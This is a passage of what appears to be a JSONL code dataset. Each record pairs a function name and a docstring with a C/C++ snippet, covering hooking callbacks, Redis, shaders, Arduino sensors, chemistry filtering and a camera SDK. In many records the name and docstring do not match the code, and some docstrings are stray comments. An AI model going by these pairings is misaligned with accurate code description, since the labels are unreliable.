tempRet)\\r\\n\\t\\t{\\r\\n\\t\\t\\t\/\/ Copy the action and return value.\\r\\n\\t\\t\\tfinalRet = tempRet;\\r\\n\\t\\t\\tmemcpy(finalRetBuf.get(), &tempRetBuf, pDetour->m_pCallingConvention->m_returnType.size);\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\t\/\/ Free the handles again.\\r\\n\\t\\tHandleSecurity sec(pCallback->GetParentRuntime()->GetDefaultContext()->GetIdentity(), myself->GetIdentity());\\r\\n\\t\\tif (returnStruct)\\r\\n\\t\\t{\\r\\n\\t\\t\\thandlesys->FreeHandle(rHndl, &sec);\\r\\n\\t\\t}\\r\\n\\t\\tif (paramStruct)\\r\\n\\t\\t{\\r\\n\\t\\t\\thandlesys->FreeHandle(pHndl, &sec);\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ If we want to use our own return value, write it back.\\r\\n\\tif (finalRet >= ReturnAction_Override)\\r\\n\\t{\\r\\n\\t\\tvoid* pPtr = pDetour->m_pCallingConvention->GetReturnPtr(pDetour->m_pRegisters);\\r\\n\\t\\tmemcpy(pPtr, finalRetBuf.get(), pDetour->m_pCallingConvention->m_returnType.size);\\r\\n\\t\\tpDetour->m_pCallingConvention->ReturnPtrChanged(pDetour->m_pRegisters, pPtr);\\r\\n\\t}\\r\\n\\r\\n\\treturn finalRet;\\r\\n}'}","id":4259}
{"content":"{'function_name': 'test_bug54', 'docstring': '\/\/void coin_adjust(__int64 src[3], __int64 dst[3], int loader)', 'code': 'void test_bug55()\\n{\\n    myredis_pool::instance()->init(10, 0);\\n\\n    myredis_helper redis(myredis_pool::instance(), \"127.0.0.1\", 6379, 6);\\n    if(redis.is_null())\\n        return;\\n    char key[64];\\n    sprintf(key, \"cb_%d_%d\", 5, 111);\\n    pptr_buffer<128, 4> field;\\n    pptr_buffer<128, 4> value;\\n    int n = 0;\\n\\n    int seconds = -1;\\n    int level = -1;\\n\\n    field.add(\"second\");\\n    field.add(\"level\");\\n    \/\/if(redis->exists(key))\\n    \/\/{\\n    \/\/    redis_bulk* out;\\n    \/\/    int n = redis->hmget(key, field.pptr, &out);\\n    \/\/    if(n == 2)\\n    \/\/    {\\n    \/\/        seconds = atoi(out[0].data);\\n    \/\/        level = atoi(out[0].data);\\n    \/\/    }\\n    \/\/}\\n    \/\/else\\n    {\\n        value.add(\"3\");\\n        value.add(\"4\");\\n        n = redis->hmset(key, field.pptr, value.pptr);\\n    }\\n\\n\\n    cout << n << endl;\\n}'}","id":4265}
{"content":"{'function_name': 'BuildAndVerifyGeneratedShaderSource', 'docstring': '\/\/ Compile the shader source code', 'code': 'bool PreProcessShaderSource( const char* const i_path_source, std::string& o_shaderSource_preProcessed )\\n\\t{\\n\\t\\tbool wereThereErrors = false;\\n\\n\\t\\t\/\/ mcpp consumes non-const char*s\\n\\t\\t\/\/ and so an array of temporary strings must be allocated\\n\\t\\tconst char* arguments_const [] =\\n\\t\\t{\\n\\t\\t\\t\/\/ The command (necessary even though it is being run as a function)\\n\\t\\t\\t\"mcpp\",\\n\\t\\t\\t\/\/ The platform #define\\n\\t\\t\\t\"-DEAE6320_PLATFORM_GL\",\\n#ifdef EAE6320_GRAPHICS_AREDEBUGSHADERSENABLED\\n\\t\\t\\t\/\/ Keep comments\\n\\t\\t\\t\"-C\",\\n#endif\\n\\t\\t\\t\/\/ Don\\'t output #line number information\\n\\t\\t\\t\"-P\",\\n\\t\\t\\t\/\/ Treat unknown directives (like #version and #extension) as warnings instead of errors\\n\\t\\t\\t\"-a\",\\n\\t\\t\\t\/\/ The input file to pre-process\\n\\t\\t\\ti_path_source\\n\\t\\t};\\n\\t\\tconst size_t argumentCount = sizeof( arguments_const ) \/ sizeof( char* );\\n\\t\\tchar* arguments[argumentCount] = { NULL };\\n\\t\\tfor ( size_t i = 0; i < argumentCount; ++i )\\n\\t\\t{\\n\\t\\t\\tconst size_t stringSize = strlen( arguments_const[i] ) + 1;\\t\/\/ NULL terminator\\n\\t\\t\\tchar* temporaryString = reinterpret_cast<char*>( malloc( stringSize ) );\\n\\t\\t\\tmemcpy( temporaryString, arguments_const[i], stringSize );\\n\\t\\t\\targuments[i] = temporaryString;\\n\\t\\t}\\n\\n\\t\\t\/\/ Configure mcpp to output to buffers instead of files\\n\\t\\tmcpp_use_mem_buffers( 1 );\\n\\t\\t\/\/ Preprocess the file\\n\\t\\tconst int result = mcpp_lib_main( static_cast<int>( argumentCount ), arguments );\\n\\t\\tif ( result == 0 )\\n\\t\\t{\\n\\t\\t\\to_shaderSource_preProcessed = mcpp_get_mem_buffer( static_cast<OUTDEST>( eae6320::mcpp::OUTDEST::Out ) );\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\twereThereErrors = true;\\n\\t\\t\\tstd::cerr << mcpp_get_mem_buffer( static_cast<OUTDEST>( eae6320::mcpp::OUTDEST::Err ) );\\n\\t\\t\\tgoto OnExit;\\n\\t\\t}\\n\\n#ifndef EAE6320_GRAPHICS_AREDEBUGSHADERSENABLED\\n\\t\\t\/\/ Remove extra new lines\\n\\t\\ttry\\n\\t\\t{\\n\\t\\t\\tstd::regex pattern_match( R\"(((\\\\r\\\\n)|(\\\\n))+)\" );\\n\\t\\t\\tconst std::string pattern_replace( \"\\\\n\" );\\n\\t\\t\\to_shaderSource_preProcessed = std::regex_replace( o_shaderSource_preProcessed, pattern_match, pattern_replace );\\n\\t\\t}\\n\\t\\tcatch ( std::regex_error& )\\n\\t\\t{\\n\\n\\t\\t}\\n#endif\\n\\n\\tOnExit:\\n\\n\\t\\tfor ( size_t i = 0; i < argumentCount; ++i )\\n\\t\\t{\\n\\t\\t\\tif ( arguments[i] )\\n\\t\\t\\t{\\n\\t\\t\\t\\tfree( arguments[i] );\\n\\t\\t\\t\\targuments[i] = NULL;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\t\/\/ Release mcpp\\'s internal buffers\\n\\t\\tmcpp_use_mem_buffers( 0 );\\n\\n\\t\\treturn !wereThereErrors;\\n\\t}'}","id":4272}
{"content":"{'function_name': 'solve', 'docstring': '\/\/    }', 'code': 'int main()\\n{\\n    #ifdef O_Amay_Valo_Basheni\\n        freopen(\"get.txt\",\"r\",stdin);\\n        freopen(\"get2.txt\",\"w+\",stdout);\\n    #endif \/\/ O_Amay_Valo_Basheni\\n    cout << 30 << \" \" << 30 << endl;\\n    for (int i = 0; i < 30; i++) {\\n        cout << 1 << \" \";\\n    }\\n \/\/    LL n, i, j, x, y;\\n\/\/\/\/    cout << INF << endl;\\n\/\/    scanf(\"%lld %lld\", &n, &k);\\n\/\/    for (i = 0; i < n; i++) {\\n\/\/        scanf(\"%lld\", &ara[i]);\\n\/\/    }\\n\/\/    mnv[0] = ara[i];\\n\/\/    for (i = 1; i < n; i++) {\\n\/\/        mnv[i] = min(mnv[i-1], ara[i]);\\n\/\/    }\\n\/\/    LL ans = solve(n-1LL, k, 0);\\n\/\/    printf(\"%lld\\\\n\", ans);\\n    return 0;\\n}'}","id":4273}
{"content":"{'function_name': 'i2cWrite', 'docstring': '\/\/ Returns 0 on success', 'code': 'uint8_t i2cWrite(uint8_t registerAddress, uint8_t *data, uint8_t length, bool sendStop) {\\n  Wire.beginTransmission(IMUAddress);\\n  Wire.write(registerAddress);\\n  Wire.write(data, length);\\n  uint8_t rcode = Wire.endTransmission(sendStop); \/\/ Returns 0 on success\\n  if (rcode) {\\n    Serial.print(F(\"i2cWrite failed: \"));\\n    Serial.println(rcode);\\n  }\\n  return rcode; \/\/ See: http:\/\/arduino.cc\/en\/Reference\/WireEndTransmission\\n}'}","id":4275}
{"content":"{'function_name': 'atoms_in_non_largest_fragment_exceed', 'docstring': '\/\/cerr << \"Checking \" << nf << \" fragments\\\\n\";', 'code': 'static int\\nprocess_fragments (Molecule & m)\\n{\\n  if (0 == maximum_fragment_count)\\n    ;\\n  else if (min_size_max_fragment_count)\\n  {\\n    if (too_many_large_fragments(m, min_size_max_fragment_count, maximum_fragment_count))\\n    {\\n      if (verbose > 1)\\n        cerr << \"Too many large components \" << m.number_fragments() << \" max is \" << maximum_fragment_count << endl;\\n      molecules_with_too_many_components++;\\n      return 0;\\n    }\\n  }\\n  else if (m.number_fragments() > maximum_fragment_count)\\n  {\\n    if (verbose > 1)\\n      cerr << \"Too many components \" << m.number_fragments() << \" max is \" << maximum_fragment_count << endl;\\n    molecules_with_too_many_components++;\\n    return 0;\\n  }\\n  \\n  if (remove_molecules_with_non_largest_fragment_natoms >= 0 && atoms_in_non_largest_fragment_exceed(m, remove_molecules_with_non_largest_fragment_natoms))\\n  {\\n    if (verbose > 1) {\\n      cerr << \"Contains large fragment(s)\\\\n\";\\n    }\\n    molecules_with_large_fragments++;\\n    return 0;\\n  }\\n\\n  if (remove_duplicate_fragments)\\n  {\\n    int fragments_removed;\\n\\n    do_remove_duplicate_fragments(m, fragments_removed);\\n\\n    if (fragments_removed)\\n    {\\n      if (verbose > 1) {\\n        cerr << fragments_removed << \" duplicate fragments removed\\\\n\";\\n      }\\n      molecules_with_duplicate_fragments_removed++;\\n    }\\n\\n    if (1 == m.number_fragments())\\n      return 1;\\n  }\\n\\n  if (remove_fragments_this_size_or_smaller)\\n  {\\n    do_remove_fragments_this_size_or_smaller(m);\\n    if (1 == m.number_fragments())\\n      return 1;\\n  }\\n\\n  if (strip_to_n_largest_fragments > 0)\\n    do_strip_to_n_largest_fragments(m, strip_to_n_largest_fragments);\\n\\n  if (known_fragment_data.active())\\n  {\\n    known_fragment_data.process(m);\\n    if (1 == m.number_fragments())\\n      return 1;\\n  }\\n\\n\/\/ If we have some fragments to definitely remove, process them\\n\\n  if (remove_fragment_queries.number_elements())\\n    do_remove_fragments_that_match_query(m, remove_fragment_queries);\\n\\n  if (reduce_to_largest_fragment)      \/\/ the most common case\\n  {\\n    if (verbose <= 1)\\n      return m.reduce_to_largest_fragment();\\n\\n    int initial_matoms = m.natoms();\\n\\n    int rc = m.reduce_to_largest_fragment();\\n    if (verbose > 1)\\n      cerr << \"Stripped to largest fragment, lost \" << (initial_matoms - m.natoms()) << \" atoms\\\\n\";\\n\\n    return rc;\\n  }\\n\\n  if (reduce_to_all_largest_fragments)\\n    return do_reduce_to_all_largest_fragments(m);\\n\\n  if (1 == remove_largest_fragment)\\n    return do_remove_largest_fragment(m);\\n\\n  if (remove_largest_fragment > 1)\\n    return do_remove_largest_fragments(m, remove_largest_fragment);\\n\\n  if (reduce_to_largest_organic_fragment)\\n  {\\n    if (verbose > 1)\\n      cerr << \"Stripped to largest organic fragment\\\\n\";\\n\\n    if (tag_for_removed_fragments.length())\\n      return extract_smaller_fragments_into_name_tag(m, tag_for_removed_fragments);\\n    else\\n      return m.reduce_to_largest_organic_fragment();\\n  }\\n\\n  if (reduce_to_largest_organic_fragment_carefully)\\n  {\\n    if (verbose > 1)\\n      cerr << \"Stripped to largest organic fragment with desirable features\\\\n\";\\n\\n    return m.reduce_to_largest_fragment_carefully();\\n  }\\n\\n  if (keep_all_organic_fragments) {\\n    int fragments_removed;\\n\\n    do_remove_nonorganic_fragments(m, fragments_removed);\\n\\n    if (fragments_removed > 0) {\\n      if (verbose) {\\n        cerr << fragments_removed << \" fragments removed for \" << m.name() << endl;\\n      }\\n      molecules_with_nonorganic_fragments_removed++;\\n      if (m.number_fragments() < 1) {\\n        return 0;\\n      }\\n    }\\n\\n    return 1;\\n  }\\n  if (smallest_fragment_queries.number_elements())\\n    return identify_fragment_by_query(m, smallest_fragment_queries, 0);\\n\\n  if (largest_fragment_queries.number_elements())\\n    return identify_fragment_by_query(m, largest_fragment_queries, 1);\\n\\n  if (keep_fragment_queries.number_elements())\\n    return identify_fragments_to_be_kept(m, keep_fragment_queries);\\n\\n  if (sort_by_fragment_size)\\n    do_sort_by_fragment_size(m);\\n\\n  if (0 == fragment_count)\\n    return 1;\\n\\n  int components = m.number_fragments();\\n\\n  int * frag_membership = new int[m.natoms()]; std::unique_ptr<int[]> free_frag_membership(frag_membership);\\n  m.fragment_membership(frag_membership);\\n\\n  int rc = trim_to_first_n_fragments(m, frag_membership, fragment_count);\\n\\n  if (verbose > 1)\\n    cerr << \"reduced from \" << components << \" fragments\\\\n\";\\n\\n  return rc;\\n}'}","id":4279}
{"content":"{'function_name': 'NTAGReadBlock_2', 'docstring': '\/\/ this holds CRC as well\\r', 'code': 'int NTAGReadBlock_3(byte blockAddr, uint8_t *data) {\\r\\n  byte length = NTAG_BLOCKLENGTH + 2;\\r\\n  byte buffer[NTAG_BLOCKLENGTH + 2] = { 0 }; \/\/ this holds CRC as well\\r\\n  MFRC522::StatusCode status;\\r\\n  if ((status = mfrc522_3.MIFARE_Read(blockAddr, buffer, &length)) != mfrc522_3.STATUS_OK) {\\r\\n    return -1;\\r\\n  }\\r\\n  if (length != NTAG_BLOCKLENGTH + 2) {\\r\\n    return -2;\\r\\n  }\\r\\n  memcpy(data, buffer, NTAG_BLOCKLENGTH);\\r\\n  return 0;\\r\\n}'}","id":4291}
{"content":"{'function_name': 'generate_route', 'docstring': '\/*\\n  cerr << \"rerouting from \" << sim.getRobot().x << \",\" << sim.getRobot().y \\n       << \" to \" << to.x << \",\" << to.y << endl;\\n  *\/', 'code': 'void \\nfix_gene(GameState &sim, gene &g, int fixfrom)\\n{\\n  \/\/cerr << \"Lifter st = \" << (sim.IsLiftOpen() ? \"open\" : \"closed\") << endl;\\n  if(((size_t)fixfrom == nlambda && !(sim.lambda_collected() == sim.config().num_lambdas())) ||\\n     (size_t)fixfrom > nlambda){\\n    GameState st = Simulate(sim, ABORT, true);\\n    g.update_score(st);\\n    return;\\n  }\\n  \\n\\n  int pointno;\\n  if((size_t)fixfrom < nlambda){\\n    pointno = g.visit_order[fixfrom];\\n  }else{\\n    \/\/cerr << \"Targets lifter\" << endl;\\n    pointno = (int)nlambda;\\n  }\\n  Point target = checkpoints[pointno];\\n\\n  \/\/ try to run until the end of this section\\n  GameState st_backup = sim;\\n  int r = try_run(sim, g.movements[fixfrom]);\\n\\n  \/\/cerr << \"target: \" << target.x << \",\" << target.y << endl;\\n  \/\/cerr << \"current: \" << sim.getRobot().x << \",\" << sim.getRobot().y << endl;\\n  if(r == 1){\\n    \/\/ \uff1e \u7a81\u7136\u306e\u52dd\u5229 \uff1c\\n    for(size_t j = fixfrom + 1; j < g.movements.size(); ++j){\\n      g.movements[j].clear();\\n      g.check_success[j] = false;\\n    }\\n    g.check_success[fixfrom] = false; \/\/FIXME\\n    g.update_score(sim);\\n    return;\\n  }\\n\\n  bool failure = (r == -1);\\n  \/\/ failure -> fix current segment with generate_route\\n  if(r == 0 &&\\n     g.check_success[fixfrom] &&\\n     sim.field().robot().position() != target) {\\n    \/\/ failed to arrive required position\\n    \/\/ rewind all progress and generate route\\n    sim = st_backup;\\n    failure = true;\\n    g.movements[fixfrom].clear();\\n  }\\n  if(failure){\\n    \/\/cerr << \"Fixing \" << fixfrom << endl;\\n    int r = generate_route(sim, pointno, g.movements[fixfrom]);\\n    if(r == 1){ \\n      \/\/ \uff1e \u7a81\u7136\u306e\u52dd\u5229 \uff1c\\n      for(size_t j = fixfrom + 1; j < g.movements.size(); ++j){\\n        g.movements[j].clear();\\n        g.check_success[j] = false;\\n      }\\n      g.check_success[fixfrom] = false; \/\/FIXME\\n      g.update_score(sim);\\n      return;\\n    }\\n    g.check_success[fixfrom] = (r == 0);\\n    \/\/cerr << \"Fix result: \" << r << \", \" << g.movements[fixfrom].size() << \" steps\" << endl;\\n  }\\n  \\n  \/\/ and fix the next chunk if exists\\n  fix_gene(sim, g, fixfrom + 1);\\n}'}","id":4292}
{"content":"{'function_name': 'main_statement', 'docstring': '\/\/\u6807\u7b7e+\u8df3\u8f6c\u8bed\u53e5', 'code': 'bool main_identifier() {\\n    sg:                                         \/\/goto\u6807\u7b7e\u7b49\u5176\u4ed6\u5b9e\u4f53\\n                                                \/\/\u5bf9\u5173\u952e\u5b57\u8fdb\u884c#define or #undef \u884c\u4e3a\u672a\u5b9a\u4e49\\n    int esp = 4;\\n\/\/\u6807\u8bc6\u7b26\u5728\u8868\u8fbe\u5f0f\u4e2d\\n    a;_a;_87;\u4e2d\u6587;\\n    EM1;EM2;\\n    func1;                                      \/\/\u6807\u8bc6\u7b26\u547d\u540d\u4e86\u679a\u4e3e\u9879\uff0c\u53d8\u91cf\uff0c\u51fd\u6570\uff0c\u5219\u8fd9\u4e2a\u6807\u8bc6\u7b26\u5c31\u662f\u8868\u8fbe\u5f0f\\n                                                \/\/\u5e76\u4e14\uff0c\u5f53\u5f53\u524d\u8868\u8fbe\u5f0f\uff08\u8868\u8fbe\u5f0f\u53ef\u4ee5\u5d4c\u5957\uff09\u5355\u72ec\u4e3a\u5f53\u524d\u6807\u8bc6\u7b26\u65f6\uff0c\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u4ee3\u8868\u7684\u662f\u6807\u8bc6\u7b26\u547d\u540d\u7684\u5b9e\u4f53\\n    [=](){esp;};                                \/\/esp\u5728\u5176\u751f\u5b58\u671f\u5916\u88ablambda\u95ed\u5305\u5bf9\u8c61\u6355\u83b7\uff0c\u6b64\u65f6\uff0c\u8fd9\u4e2aesp\u5355\u72ec\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u7684\u7c7b\u578b\u5b9e\u9645\u4e0a\u65f6\u4e00\u4e2a\\n                                                \/\/\u51fa\u73b0\u5728\u5176\u51fa\u73b0\u7684\u6700\u5185\u5b58\u7684lambda\u95ed\u5305\u5bf9\u8c61\u7684\u6210\u5458\u8bbf\u95ee\u8868\u8fbe\u5f0f\u7684\u7c7b\u578b\\n    \/\/\u65e0\u9650\u5b9a\u6807\u8bc6\u7b26\uff0c\u6709\u9650\u5b9a\u6807\u8bc6\u7b26\uff0c\u540d\u5b57\uff0c\u8bf7\u770b\u672c\u4eba\u7b80\u4e66\uff0c\u7eea\u8bba\u3002\\n    return true;\\n}'}","id":4298}
{"content":"{'function_name': 'dump_sampled_state', 'docstring': '\/\/ Remember last tick count and report only diff.', 'code': 'inline void isr_add_step_to_histogram(int quadrant, Direction entry_direction,\\n                                      Direction exit_direction,\\n                                      uint32_t ticks_in_step,\\n                                      uint32_t max_current_in_step) {\\n  \/\/ Ignoring this step if not entering and exiting this step in same forward or\\n  \/\/ backward direction.\\n  if (entry_direction != exit_direction ||\\n      entry_direction == UNKNOWN_DIRECTION) {\\n    return;\\n  }\\n  uint32_t steps_per_sec =\\n      TicksPerSecond \/ ticks_in_step;  \/\/ speed in steps per second\\n  if (steps_per_sec < 10) {\\n    return;  \/\/ ignore very slow steps as they dominate the time.\\n  }\\n  uint32_t bucket_index = steps_per_sec \/ kBucketStepsPerSecond;\\n  if (bucket_index >= kNumHistogramBuckets) {\\n    bucket_index = kNumHistogramBuckets - 1;\\n  }\\n  HistogramBucket& bucket = isr_data.state.buckets[bucket_index];\\n  bucket.total_ticks_in_steps += ticks_in_step;\\n  bucket.total_step_peak_currents += max_current_in_step;\\n  bucket.total_steps++;\\n}'}","id":4311}
{"content":"{'function_name': 'positionCalibration', 'docstring': '\/\/now the y coord (IR_Y) should be more accurate', 'code': 'boolean finePositionCalibration()\\n{\\n\/\/  Serial.println(\"fine tuning...\");\\n\\n  \/\/step one: make sure that the carriage IS already in front of the sensor\\n  if (analogRead(PIN_IR_SENSOR) <= IR_THRESHOLD) \/\/if voltage is less than or equal to threshold voltage\\n    \/\/aka if distance is greater than threshold distance\\n  {\\n\/\/    Serial.println(\"missed it\");\\n\/\/    delay(500);\\n    for(int i = 0; i < DIP_STEPS; i++) \/\/we\\'re not dipping, but it\\'s convenient to just go the same distance\\n    {\\n      motorLStep(1);\\n      motorRStep(1);\\n      delay(motorDelay);\\n    }\\n\/\/    delay(1000);\\n    \\n      \/\/ok, now we should be ready to start lifting the carriage\\n    int count = 0;  \/\/counts the steps moved upwards\\n    int reading = 0; \/\/will be used to store the sensor reading\\n\/\/    Serial.println(\"scanning...\");\\n\/\/    delay(500);\\n    while(1)\\n    {\\n      motorLStep(-1); \/\/pull both motors up a step\\n      motorRStep(-1);\\n      delay(motorDelay); \/\/delay before reading sensor to give it time to finish moving\\n            \\n      if (analogRead(PIN_IR_SENSOR) > IR_THRESHOLD) \/\/have we found it?\\n        break; \/\/yes!\\n        \\n      if (++count >= MAX_CALIBRATION_STEPS) \/\/have we moved too much (aka missed it?)\\n      {  \/\/if so, move back down to where you started, and report a failure\\n        for(int i = 0; i < MAX_CALIBRATION_STEPS + CALIBRATION_Y_CORRECTION_STEPS; i++)\\n        {\\n          motorLStep(1);\\n          motorRStep(1);\\n          delay(motorDelay);\\n        }\\n        return positionCalibration();\\n      }\\n    } \/\/end while loop\\n    \\n    for(int i = 0; i < CALIBRATION_ADJUSTMENT_STEPS; i++)\\n    {\\n      motorLStep(-1);\\n      motorRStep(-1);\\n      delay(motorDelay);\\n    }\\n  }\\n  \\n\/\/  Serial.println(\"found it\");\\n  delay(500); \/\/let it settle slightly before reading\\n  int reading = analogRead(PIN_IR_SENSOR);\\n\\n  \/\/this equation was made using line-fitting in excel with actual measurements\\n  double distance = pow(double(reading),-1.198);\\n  distance = distance * 169721.1;\/\/62930.3;\\n\/\/  Serial.print(\"distance: \");\\n\/\/  Serial.println(distance);\\n\/\/  delay(500);  \\n  \\n  \/\/set the current coordinates based on where it is relative to the IR sensor\\n  cCur.x = IR_X + distance; \/\/assumes it\\'s mounted on the left side\\n  cCur.y = IR_Y;\\n  \\n  \/\/calculate the lengths of the fishing line\\n  lengthL = getDistFromPoint(cCur, cMotorL);\\n  lengthR = getDistFromPoint(cCur, cMotorR);\\n  \\n  if ((distance > 121) || (distance < 73)) \/\/are you in the ideal sensor range yet?\\n  {                  \/\/if not, then move halfway from where you are to the center of the ideal range\\n    coord cAdjust;\\n    cAdjust.x = IR_X + 97 + (distance-97)\/2;\\n    cAdjust.y = IR_Y;\\n    moveToPoint(cAdjust);\\n    return finePositionCalibration();\\n  }\\n  \\n  \/\/at this point it has calibrated the y, and fine-tuned the x\\n  \/\/for better precision, let\\'s re-calibrate the y\\n  \\n  \/\/send it back down below the sensor\\n  for(int i = 0; i < 2*CALIBRATION_ADJUSTMENT_STEPS; i++)\\n  {\\n    motorLStep(1);\\n    motorRStep(1);\\n    delay(motorDelay);\\n  }\\n  delay(1000);\\n  \/\/now come back up\\n  while (analogRead(PIN_IR_SENSOR) <= IR_THRESHOLD) \/\/while it\\'s not seen\\n  {\\n    motorLStep(-1);\\n    motorRStep(-1);\\n    delay(motorDelay);\\n  }\\n  \\n  for(int i = 0; i < CALIBRATION_ADJUSTMENT_STEPS; i++)\\n  {\\n    motorLStep(-1);\\n    motorRStep(-1);\\n    delay(motorDelay);\\n  }\\n  \\n  \/\/now the y coord (IR_Y) should be more accurate\\n  \\n  return true;\\n}'}","id":4315}
{"content":"{'function_name': 'QueryLeaseDuration', 'docstring': '\/\/ Reuse the get lease application expiration output buffer', 'code': \"BOOL WINAPI\\naddLeaseBehavior(\\n__in PTRANSPORT_LISTEN_ENDPOINT LocalSocketAddress,\\n__in BOOL FromAny,\\n__in PTRANSPORT_LISTEN_ENDPOINT RemoteSocketAddress,\\n__in BOOL ToAny,\\n__in LEASE_BLOCKING_ACTION_TYPE BlockingType,\\n__in std::wstring alias\\n)\\n\/*++\\n\\nRoutine Description:\\n\\nThis is test API that helps to simulate network loss. It\\ncan block a message type from source address to destination address.\\n\\nParameters Description:\\n\\nSocketAddress - socket addresss of involved lease agents.\\n\\nReturn Value:\\n\\nTRUE if inputs are valid, FALSE otherwise.\\nCall GetLastError to retrieve the actual error that occured.\\n\\n--*\/\\n\\n{\\n    DWORD BytesReturned = 0;\\n    TRANSPORT_BEHAVIOR_BUFFER DeviceIoctlInputBuffer;\\n    ZeroMemory(&DeviceIoctlInputBuffer, sizeof(TRANSPORT_BEHAVIOR_BUFFER));\\n\\n    DeviceIoctlInputBuffer.BlockingType = BlockingType;\\n    \/\/\\n    \/\/ Check to see if the user mode lease layer has been successfully initialized.\\n    \/\/\\n    if (!IsLeaseLayerInitialized())\\n    {\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Check input arguments.\\n    \/\/\\n    if (NULL == LocalSocketAddress || NULL == RemoteSocketAddress)\\n    {\\n        SetLastError(ERROR_INVALID_PARAMETER);\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Initialize device IOCTL input buffer.\\n    \/\/\\n    if (memcpy_s(\\n        &DeviceIoctlInputBuffer.LocalSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT),\\n        LocalSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT)\\n        ))\\n    {\\n        return FALSE;\\n    }\\n\\n    if (memcpy_s(\\n        &DeviceIoctlInputBuffer.RemoteSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT),\\n        RemoteSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT)\\n        ))\\n    {\\n        return FALSE;\\n    }\\n\\n    DeviceIoctlInputBuffer.FromAny = (BOOLEAN)FromAny;\\n    DeviceIoctlInputBuffer.ToAny = (BOOLEAN)ToAny;\\n    int i = 0;\\n    for (; i < alias.size(); ++i)\\n    {\\n        DeviceIoctlInputBuffer.Alias[i] = alias[i];\\n    }\\n    DeviceIoctlInputBuffer.Alias[i] = L'\\\\0';\\n\\n    \/\/\\n    \/\/ Create a device IOCTL and send it to the device.\\n    \/\/\\n\\n    return DeviceIoControl(\\n        IOCTL_ADD_TRANSPORT_BEHAVIOR,\\n        &DeviceIoctlInputBuffer,\\n        sizeof(TRANSPORT_BEHAVIOR_BUFFER),\\n        NULL,\\n        0,\\n        &BytesReturned\\n        );\\n}\"}","id":4317}
{"content":"{'function_name': 'menu', 'docstring': '\/\/ Loops the program and allows re-searching infinite times', 'code': 'int main() {\\n    outlinedMessage(\"Item Search\");\\n    printf(\"\\\\n\\\\nThis demo program that lets you test an item search system which allows users to quickly search through different cars. This program can be easily populated with real products for a business and can act as an inventory check, local product database, along with many other real world uses. For this demo, you\\'ll be able to get a description of different cars and compare their miles per gallon, speed, and other important factors.\");\\n    \\n    menu();\\n\\n\\treturn 0; \/\/ End the program\\n}'}","id":4321}
{"content":"{'function_name': 'decode_m39_mix', 'docstring': '\/* fail *\/', 'code': 'extern int input_m39_mix(raw_t *raw, unsigned char data)\\n{\\n    trace(5,\"input_m39_mix: data=%02x\\\\n\",data);\\n\\n    \/* synchronize frame *\/\\n    if (raw->nbyte==0) {\\n        if (sync_m39_mix(raw->buff,data)) raw->nbyte=4;\\n        return 0;\\n    }\\n    raw->buff[raw->nbyte++]=data;\\n    if (raw->nbyte>MAXRAWLEN) {raw->nbyte=0; return 0;}\\n    if (raw->nbyte<M39MSGLEN) return 0;\\n\\n    raw->nbyte=0;\\n\\n    \/* check sum *\/\\n    if (!chksum(raw->buff+2,M39MSGLEN-3,data)) {\\n        return 0;\\n    }\\n    \/* decode oem4 message *\/\\n    return decode_m39_mix(raw);\\n}'}","id":4324}
{"content":"{'function_name': 'RIVER_CallbackServerFind', 'docstring': '\/\/printf(\"ip = 0x%08lx, port = %d, user = %s, pwd = %s, szDeviceName = %s\\\\n\", pSearchInfo->ipLocal, pSearchInfo->wPortListen, pSearchInfo->userName, pSearchInfo->userPassword, pSearchInfo->szDeviceName);', 'code': 'int RIVER_Start(int chn, RealStreamCB pCB, unsigned int dwContext, char* streamInfo, unsigned int dwIp, unsigned short wPort, char *user, char *pwd, unsigned char rtsp_over_tcp)\\n{\\n\\tif(!g_init_flag)\\n\\t{\\n\\t\\tprintf(\"RIVER_Start not inited\\\\n\");\\n\\t\\treturn -1;\\n\\t}\\n\\t\\n\\tif(chn < 0 || chn >= (int)(g_river_client_count))\\n\\t{\\n\\t\\tprintf(\"RIVER_Start chn%d error\\\\n\",chn);\\n\\t\\treturn -1;\\n\\t}\\n\\t\\n\\tERR_CODE errCode = ERR_FAILURE;\\n\\t\\n\\tif(RIVER_GetLinkStatus(chn))\\n\\t{\\n\\t\\tRIVER_Stop(chn);\\n\\t}\\n\\t\\n\\tif(!g_sdk_inited)\\n\\t{\\n\\t\\terrCode = NET_Startup(5000, LogonNotifyCallback, CheckUserPswCallback, UpdateFileCallback, ServerMsgCmdCallback, StreamWriteCheckCallback, (ChannelStreamCallback)PreviewStreamCallback);\\n\\t\\t\/\/printf(\"--->|\\\\tNET_Startup: %s\\\\n\",errCode?\"Failed!\":\"Successful!\");\\n\\t\\tif(errCode)\\n\\t\\t{\\n\\t\\t\\tprintf(\"NET_Startup failed\\\\n\");\\n\\t\\t\\treturn -1;\\n\\t\\t}\\n\\t\\tg_sdk_inited = 1;\\n\\t}\\n\\t\\n\\tchar devip[64];\\n\\tmemset(devip, 0, sizeof(devip));\\n\\t\\n\\tstruct in_addr serv;\\n\\tserv.s_addr = dwIp;\\n\\tsprintf(devip, \"%s\", inet_ntoa(serv));\\n\\t\\n\\tif(g_riverc_info[chn].hLogonServer == INVALID_HANDLE)\\n\\t{\\n\\t\\terrCode = NET_LogonServer(devip, wPort, (CHAR *)\"admin\", user, pwd, 0, &g_riverc_info[chn].hLogonServer);\\n\\t\\tif(errCode)\\n\\t\\t{\\n\\t\\t\\tprintf(\"chn%d NET_LogonServer failed\\\\n\",chn);\\n\\t\\t\\tg_riverc_info[chn].hLogonServer = INVALID_HANDLE;\\n\\t\\t\\treturn -1;\\n\\t\\t}\\n\\t}\\n\\t\\n\\tunsigned int u32StreamFlag = 0;\\n\\tif(chn >= (int)(g_river_client_count\/2))\\n\\t{\\n\\t\\tu32StreamFlag = 1;\\n\\t}\\n\\t\\n\\tOPEN_CHANNEL_INFO_EX 